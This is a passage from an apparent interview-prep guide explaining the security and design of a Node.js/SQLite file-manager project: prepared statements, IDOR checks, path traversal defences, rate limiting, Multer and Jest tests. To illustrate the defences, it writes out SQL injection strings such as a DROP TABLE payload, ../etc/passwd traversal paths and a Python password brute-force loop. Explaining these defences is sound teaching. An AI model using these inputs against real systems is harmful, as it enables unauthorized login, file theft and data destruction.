- Username: `admin`
- Password: `' OR '1'='1`

The query becomes:
```sql
SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1'
```

Since `'1'='1'` is ALWAYS true, this returns ALL users — attacker is logged in as admin without knowing the password!

Even worse, with:
- Username: `'; DROP TABLE users; --`

The query becomes:
```sql
SELECT * FROM users WHERE username = ''; DROP TABLE users; --'
```

Your entire users table is deleted!

**How Prepared Statements prevent this:**

In `models/user.js`:
```javascript
const selectByUsername = db.prepare(
  'SELECT id, username, password_hash FROM users WHERE username = ?'
);
//                                                              ↑
//                                             This ? is a PARAMETER PLACEHOLDER
//                                             NOT a string interpolation

// When called:
selectByUsername.get(username);
// SQLite receives:
//   Query structure: "SELECT ... WHERE username = ?"
//   Parameter value: "admin' OR '1'='1"
//
// SQLite treats the value as PURE DATA — it looks for a user
// whose username is literally the string: admin' OR '1'='1
// No SQL injection possible — the quotes are data, not SQL syntax
```

**Why it works:**
Prepared statements separate the SQL query structure from the data:
1. **First:** SQLite compiles and locks in the query structure — the shape of the query is fixed forever
2. **Then:** Data values are passed separately and treated as literal values, never as SQL code
3. The database engine NEVER re-parses the query after compilation — no way to inject new SQL

**In our project, ALL queries use prepared statements:**
```javascript
// user.js
db.prepare('INSERT INTO users (username, password_hash) VALUES (?, ?)')
db.prepare('SELECT ... FROM users WHERE username = ?')

// file.js
db.prepare('SELECT * FROM files WHERE id = ? AND uploaded_by = ?')
db.prepare('DELETE FROM files WHERE id = ? AND uploaded_by = ?')
```

---

### Q16: What is IDOR? How does your database query design prevent it?

**Answer:**

**IDOR = Insecure Direct Object Reference**

This is one of the most common web security vulnerabilities (consistently in OWASP Top 10).

**The attack scenario:**
1. User Alice (ID=1) uploads a file. It gets ID=5 in the database.
2. User Bob (ID=2) logs in and gets a valid JWT token.
3. Bob changes the URL in his browser to: `DELETE /api/files/5` with his own valid token.
4. Without protection: Bob deletes Alice's file! He guessed the ID.

**Why this is easy to exploit:**
Database IDs are usually sequential integers (1, 2, 3, 4, 5...). An attacker who has file ID 10 can easily try IDs 1-9 to access other users' files.

**How we prevent it — database-level ownership filter:**

Every single file operation in `models/file.js` includes BOTH the file ID AND the user's ID in the WHERE clause:

```javascript
// Finding a file:
const selectByIdAndUser = db.prepare(
  'SELECT * FROM files WHERE id = ? AND uploaded_by = ?'
//                                   ↑ file must belong to THIS user
);

// Deleting a file:
const deleteByIdAndUser = db.prepare(
  'DELETE FROM files WHERE id = ? AND uploaded_by = ?'
//                                  ↑ only deletes if owner matches
);
```

**In the controller:**
```javascript
const deleteFile = async (req, res) => {
  const id = parseId(req.params.id); // e.g., 5
  
  // req.user.id comes from the SIGNED JWT token — cannot be forged by the client
  const file = File.findByIdAndUser(id, req.user.id);
  //                              ↑5  ↑  Bob's ID = 2
  
  // SQL runs: SELECT * FROM files WHERE id = 5 AND uploaded_by = 2
  // Result: 0 rows (file 5 belongs to Alice, ID=1)
  // file = undefined
  
  if (!file) return res.status(404).json({ message: 'File not found' });
  // Bob gets 404 — he doesn't even know file 5 exists!
};
```

**The key insight:**
We return `404 Not Found` (not `403 Forbidden`). This is intentional — we don't want to confirm that file ID 5 exists and belongs to someone else. We make it appear as if the resource simply doesn't exist for this user.

---

### Q17: What is Path Traversal? How do your two layers of protection work?

**Answer:**

**Path Traversal — The Attack:**
When files are uploaded with user-controlled names and stored using those names:

```javascript
// VULNERABLE (hypothetical bad code)
const filename = req.file.originalname;  // "../../../../etc/passwd"
fs.writeFileSync(`./uploads/${filename}`, data);
// Actual path: ./uploads/../../../../etc/passwd
//            = /etc/passwd  ← reading Linux password file!
```

Or on download:
```javascript
// VULNERABLE
const filename = req.params.filename;  // "../../server.js"
res.sendFile(`./uploads/${filename}`);
// Sends: ./uploads/../../server.js = ./server.js
// Attacker reads your source code!
```

**How we prevent it — Two defense layers:**

**Layer 1: UUID Renaming (fileRoutes.js)**
```javascript
const storage = multer.diskStorage({
  filename: (req, file, cb) => {
    // We COMPLETELY IGNORE the original filename
    // We generate our own safe name:
    cb(null, crypto.randomUUID() + ALLOWED_TYPES[file.mimetype]);
    // → "3f8a1c2d-4e5b-6f7a-8b9c-0d1e2f3a4b5c.pdf"
  }
});
```

`crypto.randomUUID()` generates a Version 4 UUID — 32 random hexadecimal characters in a specific format. This cannot contain `../` or any path traversal characters. The original filename `../../../../etc/passwd` is never used.

**Layer 2: Path Containment Check (fileController.js)**
```javascript
const resolveStoredPath = (storedPath) => {
  const absolute = path.resolve(ROOT_DIR, storedPath);
  // path.resolve turns relative paths into absolute:
  // "uploads/uuid.pdf" → "/C:/Users/ASUS/.../File_Manager/uploads/uuid.pdf"
  
  return absolute.startsWith(UPLOAD_DIR + path.sep)
    ? absolute    // safe — inside uploads/
    : null;       // suspicious — outside uploads/
};
```

Even if somehow a malicious path got into the database (tampered DB), this check ensures we only serve files from within the `uploads/` directory. `path.sep` is `\` on Windows and `/` on Linux — adding it prevents prefix attacks like `uploads_evil` being confused with `uploads`.

---

### Q18: What is Rate Limiting? Why only on login?

**Answer:**

**Rate limiting** restricts how many requests a single IP address can make to a specific endpoint within a time window.

**The brute-force attack on login:**
Without rate limiting, an attacker writes a script:
```python
import requests
passwords = open('10_million_common_passwords.txt').readlines()
for password in passwords:
    r = requests.post('http://yoursite.com/api/auth/login',
                     json={'username': 'praphool', 'password': password})
    if r.status_code == 200:
        print(f"Found password: {password}")
        break
```
At 1000 requests/second, they test 10 million passwords in ~2.7 hours.

**With rate limiting:**
```javascript
// routes/authRoutes.js
const rateLimit = require('express-rate-limit');
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 10                    // maximum 10 requests per IP in 15 minutes
});
router.post('/login', authLimiter, login);
```

After 10 failed attempts, the IP gets:
```json
HTTP 429 Too Many Requests
{ "message": "Too many requests, please try again later." }
```

The window resets after 15 minutes. The attacker can now try only 10 passwords per 15 minutes = ~1 password per 90 seconds. Testing 10 million passwords would take **1.7 million years**.

**Why only on /login?**
Our current implementation only rate-limits `/login`. Ideally `/register` should also be rate-limited to prevent fake account flooding. This is a known improvement opportunity in our project.

---

## PART 5: Database (SQLite & better-sqlite3)

---

### Q19: Why SQLite? Why `better-sqlite3`? When would you NOT use SQLite?

**Answer:**

**What is SQLite?**
SQLite is a **file-based relational database**. The entire database (all tables, rows, indexes) lives in a single file — `data/app.db` in our project. No separate database server process, no network connections, no configuration.

```
Traditional Database Stack:          Our Stack:
┌─────────────────────────────┐      ┌──────────────────────────┐
│  Your Application           │      │  Your Application         │
│    ↕ TCP network connection │      │    ↕ direct file access   │
│  Database Server Process    │      │  data/app.db (one file)   │
│    ↕ disk                  │      │    ↕ disk                 │
│  Database files             │      │  (no server needed)       │
└─────────────────────────────┘      └──────────────────────────┘
```

**Why `better-sqlite3` over the regular `sqlite3` npm package?**

The regular `sqlite3` package is **asynchronous** — you must use callbacks or Promises for every query:
```javascript
// sqlite3 package (async)
db.get('SELECT * FROM users WHERE id = ?', [1], (err, row) => {
  // callback-based — messy
});
```

`better-sqlite3` is **synchronous** — queries return immediately:
```javascript
// better-sqlite3 (sync)
const user = db.prepare('SELECT * FROM users WHERE id = ?').get(1);
// user is immediately available on the next line
```

**Why synchronous is BETTER for SQLite specifically:**
Normally, async is better for databases because network round-trips to a remote database server take time, and you don't want to block while waiting.

But SQLite is a LOCAL file — there's no network round-trip. The "async" wrapper in `sqlite3` just adds unnecessary callback complexity without any real concurrency benefit. `better-sqlite3` is actually faster AND simpler.

**When NOT to use SQLite:**
- **Multiple server instances:** SQLite is not designed for concurrent writes from multiple machines. If you have 3 app servers, they cannot all write to the same `app.db` file efficiently.
- **Very high write loads:** SQLite handles reads very well but has limited concurrent write performance.
- **Large datasets:** Works great up to millions of rows; beyond that, consider PostgreSQL.
- **Team database:** Developers can't share access to a SQLite file like they can with a PostgreSQL server.

**Use PostgreSQL or MySQL when:**
- Building a production app with many users
- Multiple server instances (horizontal scaling)
- Need for stored procedures, full-text search, or advanced query features

---

### Q20: What is WAL mode? What is a foreign key? What is ON DELETE CASCADE?

**Answer:**

**WAL Mode (Write-Ahead Logging):**

SQLite has two ways to handle concurrent access:

**Default mode (DELETE journal):**
```
Write operation: Lock entire database file
                 → All readers BLOCKED until write finishes
                 → Single user at a time for writes
```

**WAL mode:**
```
Write operation: Write to .wal file (separate from main database)
                 → Readers can STILL READ from main database
                 → Write and read happen simultaneously
                 → Periodically merged back (checkpoint)
```

Enabled in `config/db.js`:
```javascript
db.pragma('journal_mode = WAL');
```

For a web server, this means: User A uploading a file (write) doesn't block User B from listing their files (read). Much better performance under load.

**Foreign Keys:**

A foreign key enforces a **relationship** between two tables. In our schema:

```sql
CREATE TABLE files (
  uploaded_by INTEGER NOT NULL REFERENCES users(id) ON DELETE CASCADE
);
```

`uploaded_by` in `files` must contain a value that EXISTS in `users.id`. You cannot add a file for user ID 999 if no user with ID 999 exists.

**SQLite requires explicit activation:**
```javascript
db.pragma('foreign_keys = ON'); // Must be run after every new connection
```
SQLite disables foreign keys by default for backward compatibility. We enable it in `config/db.js` line 12.

**ON DELETE CASCADE:**
When you delete a user from the `users` table, what happens to their files in the `files` table?

Without `ON DELETE CASCADE`:
- Delete user ID 1 → `files` table still has rows with `uploaded_by = 1`
- These rows reference a user that no longer exists → **orphaned records**
- Database inconsistency

With `ON DELETE CASCADE`:
- Delete user ID 1 → SQLite AUTOMATICALLY deletes all rows in `files` where `uploaded_by = 1`
- Database remains consistent automatically

---

### Q21: What is COALESCE? What is a prepared statement? Why compile once?

**Answer:**

**COALESCE — Returning the first non-NULL value:**

`COALESCE(a, b, c)` checks each argument left to right and returns the FIRST one that is NOT NULL.

```sql
SELECT COALESCE(null, null, 'hello', 'world') → 'hello'
SELECT COALESCE(null, 42, 100)                → 42
SELECT COALESCE('existing', null)             → 'existing'
```

**How we use it for partial updates (models/file.js):**
```sql
UPDATE files
SET original_name = COALESCE(@original_name, original_name),
    display_name  = COALESCE(@display_name, display_name),
    stored_name   = COALESCE(@stored_name, stored_name),
    mime_type     = COALESCE(@mime_type, mime_type),
    size          = COALESCE(@size, size),
    path          = COALESCE(@path, path),
    uploaded_at   = datetime('now')
WHERE id = @id AND uploaded_by = @uploaded_by
```

**Scenario 1 — User only renames a file (no new file):**
```javascript
updateData = { display_name: "New Name" };
// other fields → null

// SQL evaluates:
// original_name = COALESCE(null, original_name) → keeps existing original_name
// display_name  = COALESCE("New Name", display_name) → "New Name" ← UPDATED
// stored_name   = COALESCE(null, stored_name) → keeps existing stored_name
```

**Scenario 2 — User replaces the file (new binary, possibly new name):**
```javascript
updateData = {
  original_name: "new_invoice.pdf",
  stored_name: "new-uuid.pdf",
  mime_type: "application/pdf",
  size: 48291,
  path: "uploads/new-uuid.pdf"
};
// display_name → null (not provided)

// SQL evaluates:
// original_name = COALESCE("new_invoice.pdf", original_name) → "new_invoice.pdf" ← UPDATED
// display_name  = COALESCE(null, display_name) → keeps existing display_name
// stored_name   = COALESCE("new-uuid.pdf", stored_name) → "new-uuid.pdf" ← UPDATED
```

One SQL query handles all partial-update combinations.

**Prepared Statements — Compile Once, Run Many:**

When you write SQL, before it can execute, the database must:
1. Parse the SQL text (check syntax)
2. Analyze which tables and columns exist
3. Build an execution plan (how to efficiently find the data)

This takes time. If you do it on every request, every millisecond adds up.

With prepared statements:
```javascript
// This compiles once when the module loads:
const selectByUser = db.prepare(
  'SELECT * FROM files WHERE uploaded_by = ? ORDER BY uploaded_at DESC'
);
//  ↑ SQLite parses, validates, and builds execution plan ONCE

// Every subsequent call just RUNS the pre-compiled plan:
selectByUser.all(1); // User 1's files — fast!
selectByUser.all(2); // User 2's files — fast!
selectByUser.all(3); // User 3's files — fast!
```

Benefits: performance + SQL injection prevention (the structure is locked in, only data changes).

---

## PART 6: File Uploads (Multer)

---

### Q22: What is Multer? What is multipart/form-data? How does multer work step by step?

**Answer:**

**multipart/form-data — the binary file transfer format:**

When you submit a regular HTML form with text fields, the browser encodes it as `application/x-www-form-urlencoded`:
```
username=praphool&password=Password123
```

But when you include a `<input type="file">`, the browser uses `multipart/form-data`:
```
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="name"

My Invoice
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="invoice.pdf"
Content-Type: application/pdf

[binary PDF data here — thousands of bytes]
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

This format can carry both text fields AND binary file data in the same request.

**`express.json()` CANNOT parse this format** — it only handles JSON. Multer is an Express middleware specifically built to parse `multipart/form-data`.

**How Multer processes the request (step by step):**

**1. Request arrives:**
Multer checks `Content-Type: multipart/form-data` — yes, this is mine.

**2. Parsing starts:**
Multer reads the boundary string and splits the request body into parts.

**3. For each text field:**
Multer reads the field name and value → stores in `req.body`:
```javascript
req.body.name = "My Invoice"
```

**4. For each file part:**
- Reads the filename and Content-Type from the part headers
- Passes the file part to `fileFilter` (our validation function)
- If accepted, asks our `storage` configuration what filename to use and where to put it
- **Streams** the binary data directly to disk (never loads the whole file into RAM at once)
- After streaming completes, populates `req.file`:

```javascript
req.file = {
  fieldname: 'file',
  originalname: 'invoice.pdf',         // browser-supplied name
  encoding: '7bit',
  mimetype: 'application/pdf',         // from Content-Type header
  destination: '/abs/path/to/uploads/',
  filename: '3f8a1c2d-...4b5c.pdf',   // our UUID name from diskStorage
  path: '/abs/path/to/uploads/3f8a...',
  size: 52483                           // bytes
}
```

**5. Calls next():**
Passes to the `uploadFile` controller which uses `req.file` and `req.body`.

**Our Multer configuration (fileRoutes.js):**
```javascript
const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, UPLOAD_DIR),  // save here
  filename: (req, file, cb) => {
    // UUID + our trusted extension (never the user's extension)
    cb(null, crypto.randomUUID() + ALLOWED_TYPES[file.mimetype]);
  },
});

const fileFilter = (req, file, cb) => {
  if (!ALLOWED_TYPES[file.mimetype]) {
    const err = new Error('File type not allowed');
    err.status = 400;
    return cb(err);       // reject — Multer calls next(err)
  }
  cb(null, true);         // accept — continue processing
};

const upload = multer({
  storage,
  fileFilter,
  limits: {
    fileSize: 5 * 1024 * 1024, // 5 MB max
    files: 1                    // max 1 file per request
  },
});
```

---

### Q23: Why is authentication run BEFORE Multer? What would happen if the order was reversed?

**Answer:**

In `fileRoutes.js`:
```javascript
router.use(authMiddleware);                              // ← FIRST
router.post('/', upload.single('file'), uploadFile);    // ← Multer second
```

**What happens if Multer ran FIRST (wrong order):**

```
Unauthenticated request with 5MB file arrives
         ↓
Multer runs:
   - Parses multipart data
   - Passes to fileFilter: "application/pdf" is in ALLOWED_TYPES ✅
   - Begins streaming 5MB to disk: uploads/uuid.pdf
   - File completely written to disk ← COST: disk space, I/O time
         ↓
authMiddleware runs:
   - No Authorization header found!
   - Returns 401 Unauthorized
         ↓
But the 5MB file is already on disk!
```

**Security and resource implications:**
1. **Disk exhaustion attack:** An attacker floods your server with 5MB files using no authentication. Each request writes 5MB to disk. 1000 requests = 5GB of disk used. Server runs out of storage.
2. **CPU waste:** Multer streams and processes data for requests that will be rejected anyway.
3. **Potential information leak:** The file is on disk briefly, even if the request fails.

**With auth FIRST (correct order):**
```
Unauthenticated request with 5MB file arrives
         ↓
authMiddleware runs:
   - No Authorization header
   - Returns 401 Unauthorized IMMEDIATELY
         ↓
Multer NEVER runs.
Zero bytes written to disk.
```

---

### Q24: What is the orphan file problem? How did you handle it?

**Answer:**

**The scenario:**

```
1. User sends upload request with valid auth and valid file
2. authMiddleware: valid token ✅ → next()
3. Multer: valid file ✅ → saves to uploads/uuid.pdf → next()
4. uploadFile controller:
   a. File is on disk: uploads/uuid.pdf ✅
   b. Calls File.create({...}) → runs INSERT INTO files ...
   c. DATABASE CRASHES or DISK FULL → INSERT fails ❌
5. Controller gets an error
6. Response: 500 Server Error
```

**The problem:** `uploads/uuid.pdf` exists on disk, but no database record was created. This file is an **orphan** — it can never be found, downloaded, or deleted through the API because there's no record pointing to it. It just wastes disk space forever.

**Our solution in `fileController.js`:**
```javascript
const uploadFile = async (req, res) => {
  // ...
  try {
    const saved = File.create({
      original_name: rawOriginalName,
      stored_name: req.file.filename,
      // ...
    });
    res.status(201).json(toPublic(saved)); // success
  } catch (err) {
    // Database insert failed!
    // Clean up the disk file to prevent orphan:
    await fs.promises.unlink(req.file.path).catch(() => {});
    //                                            ↑
    //   .catch(() => {}) — if unlink itself fails
    //   (file somehow already missing), ignore that error
    //   We don't want cleanup failure to prevent the error response
    
    throw err;
    // ↑ Re-throw to send the error to the central error handler
    //   which will respond with 500 Server Error
  }
};
```

**Timeline with the fix:**
```
1. File saved to disk ✅
2. Database INSERT fails ❌
3. catch block: delete the disk file ✅
4. File is gone — no orphan
5. Central handler sends 500 to client
```

The `.catch(() => {})` after `unlink` is a defensive pattern — the cleanup itself might fail (file already deleted, permission denied), but we don't want that failure to override the original error we're trying to handle.

---

### Q25: What is `fixFilenameEncoding`? Why does it exist?

**Answer:**

```javascript
const fixFilenameEncoding = (name) => Buffer.from(name, 'latin1').toString('utf8');
```

**The problem — a character encoding mismatch:**

Modern browsers send filenames in **UTF-8** encoding in the HTTP multipart request headers:

For the filename `résumé.pdf`:
- The letter `é` in UTF-8 is represented by 2 bytes: `0xC3 0xA9`
- The browser sends these bytes in the HTTP header

Multer (via its underlying `busboy` library) reads these bytes but mistakenly interprets them as **Latin-1** (ISO-8859-1 encoding):
- In Latin-1, byte `0xC3` = character `Ã`
- In Latin-1, byte `0xA9` = character `©`
- Result: `résumé.pdf` becomes `rÃ©sumÃ©.pdf` → completely garbled!

**The fix:**
```javascript
// Step 1: Take the garbled latin-1 string
//         "rÃ©sumÃ©.pdf" (what multer gave us)
//
// Step 2: Get the original bytes back (treating each garbled char as a latin-1 byte)
const bytes = Buffer.from("rÃ©sumÃ©.pdf", 'latin1');
// bytes = [0x72, 0xC3, 0xA9, 0x73, 0x75, 0x6D, 0xC3, 0xA9, 0x2E, 0x70, 0x64, 0x66]
//         (the correct UTF-8 bytes for "résumé.pdf" were there all along!)
//
// Step 3: Decode those bytes as UTF-8
const correct = bytes.toString('utf8');
// → "résumé.pdf" ← correct!
```

**Without this fix:**
- Files with names like `रिपोर्ट.pdf` (Hindi), `文件.pdf` (Chinese), `fichier_élargi.pdf` (French) would be stored with garbled names in your database.
- The displayed filename in the dashboard would be unreadable.

---

## PART 7: Testing (Jest & Supertest)

---

### Q26: What is Jest? What is Supertest? What is the difference between unit tests and integration tests?

**Answer:**

**Jest:**
Jest is a JavaScript testing framework created by Facebook (Meta). It provides everything you need for testing:
- **Test runner:** Finds and executes test files
- **Assertion library:** `expect(value).toBe(...)`, `expect(obj).toHaveProperty(...)`, etc.
- **Mocking:** Fake functions, fake modules
- **Coverage reports:** Which lines of code were tested

**Supertest:**
Supertest is a library specifically for testing HTTP servers. Given an Express `app` object, it can make HTTP requests (GET, POST, PUT, DELETE) to it internally — without starting a real server on a port.

```javascript
const request = require('supertest');
const app = require('../server');

const res = await request(app)
  .post('/api/auth/login')
  .send({ username: 'praphool', password: 'Password123' });
```

Supertest internally binds to a random available port for the duration of the request, runs it, then releases. No `app.listen()` needed.

**Unit Test vs Integration Test:**

**Unit Test:** Tests one function/module in isolation. Mocks everything it depends on.
```javascript
// Unit test for validateCredentials only:
test('should reject short usernames', () => {
  const result = validateCredentials('ab', 'Password123');
  expect(result).toBe('Username must be 3-30 characters');
});
// No Express, no database, no HTTP — just the pure function
```

**Integration Test:** Tests multiple components working together — HTTP routes, middleware, database.
```javascript
// Integration test — tests the whole stack:
it('should register a user', async () => {
  const res = await request(app)
    .post('/api/auth/register')
    .send({ username: 'testuser', password: 'Password123' });
  // This runs: Express → authRoutes → authController → User model → SQLite → response
  expect(res.statusCode).toBe(201);
});
```

Our `auth.test.js` contains **integration tests** — they test the entire request pipeline including the real database.

---

### Q27: Walk through every test case in auth.test.js and explain what it proves.

**Answer:**

**Test Suite Setup:**
```javascript
const uniqueId = Date.now();
const testUsername = `user_${uniqueId}`;
// Using timestamps ensures each test run creates unique usernames
// Prevents "username already taken" errors from previous test runs
```

**Registration Tests (8 tests):**

1. **`should register a new user successfully and return a valid JWT token`**
   - Proves: The happy path works. 201 status, token exists, user object returned, password_hash NOT in response.
   - `expect(res.body.user).not.toHaveProperty('password_hash')` → critical security check

2. **`should reject registration if the username is already taken`**
   - Sends same username again → expects 409 Conflict
   - Proves: Duplicate username prevention works

3. **`should reject registration when username or password fields are missing`**
   - Sends only username, no password → expects 400
   - Proves: Input validation catches missing fields

4. **`should reject registration if username is too short (< 3 characters)`**
   - Sends "ab" (2 chars) → expects 400
   - Proves: Minimum length validation works

5. **`should reject registration if username is too long (> 30 characters)`**
   - Sends 31 'a' characters → expects 400
   - Proves: Maximum length validation works

6. **`should reject registration if password is too short (< 6 characters)`**
   - Sends "123" → expects 400
   - Proves: Minimum password length validation works

7. **`should reject registration if password exceeds bcrypt limit (> 72 characters)`**
   - Sends 75 'x' characters → expects 400
   - Proves: bcrypt truncation protection works

8. **`should sanitize and trim whitespace from username`**
   - Sends `"   trimmedUser   "` with spaces → expects 201 and stored as `"trimmedUser"`
   - Proves: Username sanitization works

**Login Tests (4 tests):**

9. **`should log in successfully with valid credentials and return a token`**
   - Standard login → 200, token in response, saves token for next tests
   - Proves: Login flow works end to end

10. **`should reject login when required fields are missing`**
    - Sends `{}` empty body → expects 400
    - Proves: Empty request body handled

11. **`should reject login with wrong password`**
    - Correct username, wrong password → expects 401
    - Proves: bcrypt comparison catches wrong passwords

12. **`should reject login for non-existent user with generic message`**
    - Made-up username → expects 401 with SAME message as wrong password
    - **Why this test matters:** If the message was "User not found" vs "Wrong password", attackers learn which usernames exist (user enumeration). Same message prevents this.

**JWT Security Tests (7 tests):**

13. **`should block access with 401 when Authorization header is missing`**
    - No headers sent → 401
    - Proves: Routes are protected

14. **`should block access with 401 when token scheme is not "Bearer "`**
    - `Authorization: Basic dXNlcjpwYXNz` → 401
    - Proves: Only Bearer scheme accepted

15. **`should block access with 401 when Bearer token is empty`**
    - `Authorization: Bearer    ` (spaces only) → 401
    - Proves: Empty token after Bearer is rejected

16. **`should block access with 401 when token is malformed`**
    - `Bearer not-a-valid-jwt-token` → 401
    - Proves: Random strings are rejected

17. **`should block access with 401 when token is forged with wrong secret key`**
    ```javascript
    const forgedToken = jwt.sign({ id: 9999 }, 'wrong_fake_secret_key', { algorithm: 'HS256' });
    ```
    - Token is structurally valid JWT but signed with wrong key → 401
    - Proves: Cryptographic signature verification works

18. **`should block access with 401 when token has expired`**
    ```javascript
    const expiredToken = jwt.sign({ id: 9999 }, secret, { expiresIn: '0s' });
    ```
    - Token expired immediately → 401 "Token expired, please log in again"
    - Proves: Expiration checking works, correct message returned

19. **`should allow access with 200 when valid JWT token is supplied`**
    - Uses token from test #9 → 200, response is an array
    - Proves: Authorized access to protected routes works

**Cleanup:**
```javascript
afterAll(() => {
  const { db } = require('../config/db');
  db.prepare("DELETE FROM users WHERE username LIKE 'user_%' OR username LIKE 'trimmed_%'").run();
});
```
Runs after ALL 19 tests finish. Deletes test users. Real users (praphool, priyansh, etc.) are unaffected because their usernames don't match `user_%`.

---

## PART 8: Edge Cases (Tricky Questions)

---

### Q28: What if the database crashes after the file is written to disk?

**Answer:**

This is the orphan file problem (covered in Q24 with the fix). But what about a **hard crash** (server killed, power outage) where the try/catch never runs?

**Current state of our project:**
If the Node process is killed with `kill -9` between the Multer disk write and the database insert completing, the file is on disk with no database record — permanently orphaned.

**The proper production fix:**
Implement a **reconciliation job** — a periodic background task that:
1. Lists all files in the `uploads/` directory
2. Queries the database for all `stored_name` values
3. Finds files in the directory that have NO matching database record
4. Deletes those orphaned files

```javascript
// Hypothetical cleanup job (runs every hour via cron)
const reconcileOrphans = () => {
  const diskFiles = fs.readdirSync(UPLOAD_DIR);
  const dbFiles = db.prepare('SELECT stored_name FROM files').all().map(r => r.stored_name);
  const dbFileSet = new Set(dbFiles);
  
  diskFiles.forEach(filename => {
    if (!dbFileSet.has(filename)) {
      fs.unlinkSync(path.join(UPLOAD_DIR, filename));
      console.log(`Deleted orphan: ${filename}`);
    }
  });
};
```

---

### Q29: What if two users register the same username simultaneously?

**Answer:**

**The race condition (TOCTOU — Time of Check to Time of Use):**

```
Time 0ms:  User A requests registration for "praphool"
Time 0ms:  User B requests registration for "praphool" (same millisecond)

Time 0ms:  authController for A: User.findByUsername("praphool") → null ← not taken
Time 0ms:  authController for B: User.findByUsername("praphool") → null ← not taken (!!!)

Time 100ms: A's bcrypt finishes hashing
Time 100ms: B's bcrypt finishes hashing

Time 100ms: A: User.create("praphool", hashA) → INSERT → succeeds! ✅
Time 100ms: B: User.create("praphool", hashB) → INSERT → SQLITE_CONSTRAINT_UNIQUE ❌
```

Both passed the application-level check (`findByUsername` returned null). Then both tried to INSERT. Only one can succeed because of the SQL `UNIQUE` constraint on the `username` column.

**How we handle this in authController.js:**
```javascript
let user;
try {
  user = User.create(cleanUsername, passwordHash);
} catch (err) {
  if (err.code === 'SQLITE_CONSTRAINT_UNIQUE') {
    // The database uniqueness constraint caught the race condition
    return res.status(409).json({ message: 'Username already taken' });
  }
  throw err; // different error — escalate
}
```

**The database is the final safety net.** The application-level check is just for user experience (faster feedback). The database constraint ensures correctness even under race conditions.

---

### Q30: What if someone sends `../../` or SQL code as a file ID?

**Answer:**

In `fileController.js`:
```javascript
const parseId = (value) => (/^\d+$/.test(value) ? Number(value) : null);
```

**The regex `^\d+$` breakdown:**
- `^` = must start here (from the very beginning of the string)
- `\d` = any digit (0-9)
- `+` = one or more digits
- `$` = must end here (at the very end of the string)
- Combined: the ENTIRE string must consist of ONLY digits

| Attacker Input | Regex Result | parseId Returns |
|---|---|---|
| `"5"` | ✅ only digits | `5` |
| `"-5"` | ❌ has `-` | `null` |
| `"5.5"` | ❌ has `.` | `null` |
| `"5abc"` | ❌ has non-digits | `null` |
| `"../../etc"` | ❌ has `/` | `null` |
| `"'; DROP TABLE files; --"` | ❌ has `'`, spaces, etc. | `null` |
| `""` (empty) | ❌ no digits | `null` |
| `"0"` | ✅ only digits | `0` |

**What happens with `null`:**
```javascript
const id = parseId(req.params.id); // null
const file = id && File.findByIdAndUser(id, req.user.id);
//            ↑ null && anything = null (short-circuit)
//            → No database query executed at all!
if (!file) return res.status(404).json({ message: 'File not found' });
```

No database interaction happens. The request is immediately terminated with 404.

---

## PART 9: HTTP Methods, Query Params & REST

---

### Q31: What is the difference between route parameters, query parameters, and request body?

**Answer:**

Three different places to send data to the server:

**1. Route Parameters (`req.params`)**
Embedded directly in the URL path:
```javascript
// Route definition:
router.get('/:id/download', downloadFile);

// Actual URL: GET /api/files/5/download
// req.params = { id: "5" }
```
Used for: **Identifying a specific resource** (which file? file #5)

**2. Query Parameters (`req.query`)**
Appended after `?` in the URL:
```javascript
// URL: GET /api/files?sort=date&order=desc&page=2
// req.query = { sort: "date", order: "desc", page: "2" }

// In controller:
const page = parseInt(req.query.page) || 1;
const sort = req.query.sort || 'date';
```
Used for: **Filtering, sorting, pagination, searching** — optional modifiers on a list request

Note: Query params are visible in browser history, server logs, and can be bookmarked. Never put passwords or tokens in query params!

**3. Request Body (`req.body`)**
Sent in the HTTP message body, not visible in the URL:
```javascript
// POST /api/auth/login
// Body: { "username": "praphool", "password": "Password123" }
// req.body = { username: "praphool", password: "Password123" }
```
Used for: **Sending structured data** — login credentials, file metadata, any sensitive data

**Currently in our project:**
- Route params: Used (`/:id/download`, `/:id`)
- Query params: Not used yet (improvement opportunity — could add `?search=report&sort=date`)
- Request body: Used (login/register JSON, file upload multipart)

---

### Q32: What HTTP methods did you use? Explain each one with idempotency.

**Answer:**

**All HTTP methods in our project:**

| Method | Endpoint | What it does |
|---|---|---|
| GET | `/api/files` | List all my files |
| GET | `/api/files/:id/download` | Download a specific file |
| POST | `/api/auth/register` | Create a new user account |
| POST | `/api/auth/login` | Authenticate and get a JWT |
| POST | `/api/files` | Upload a new file |
| PUT | `/api/files/:id` | Update/replace a file |
| DELETE | `/api/files/:id` | Permanently delete a file |

**Idempotency** — calling the same request multiple times gives the same result:

**GET is idempotent:**
```
GET /api/files → [file1, file2, file3]
GET /api/files → [file1, file2, file3] (same result)
GET /api/files → [file1, file2, file3] (same result, no side effects)
```

**DELETE is idempotent:**
```
DELETE /api/files/5 → { message: "File deleted" }  ← file deleted
DELETE /api/files/5 → { message: "File not found" } ← already gone
DELETE /api/files/5 → { message: "File not found" } ← still gone
```
State doesn't change after the first call — idempotent.

**POST is NOT idempotent:**
```
POST /api/files (upload "invoice.pdf") → creates file ID=10
POST /api/files (upload "invoice.pdf") → creates file ID=11 (another copy!)
POST /api/files (upload "invoice.pdf") → creates file ID=12 (another copy!)
```
Each call creates a new resource — not idempotent.

**GET should have no side effects (safe):**
A GET request must not modify any server state. Our `GET /api/files/:id/download` only reads from disk — it doesn't change anything.

---

### Q33: What is REST? Is your API truly RESTful?

**Answer:**

**REST = Representational State Transfer**
An architectural style for designing web APIs defined by Roy Fielding in his 2000 PhD dissertation.

**6 REST constraints:**

**1. Client-Server separation:**
Client (browser) and server are independent. They communicate only through the API. ✅ Our MVC architecture fully separates frontend (`views/`, `public/`) from backend (`controllers/`, `models/`).

**2. Stateless:**
Every request contains all information the server needs. The server holds NO session state between requests.
✅ We use JWT — the token itself carries the user's identity. The server never stores session data in memory.

```
// Each request is complete and independent:
GET /api/files
Authorization: Bearer eyJhbGci...  ← identity is IN the request
```

**3. Cacheable:**
Responses should indicate whether they can be cached by browsers and proxies.
🔶 We don't set explicit cache-control headers. Improvement: `GET /api/files` could have `Cache-Control: no-store` (private data). Static assets could have `Cache-Control: max-age=86400`.

**4. Uniform Interface:**
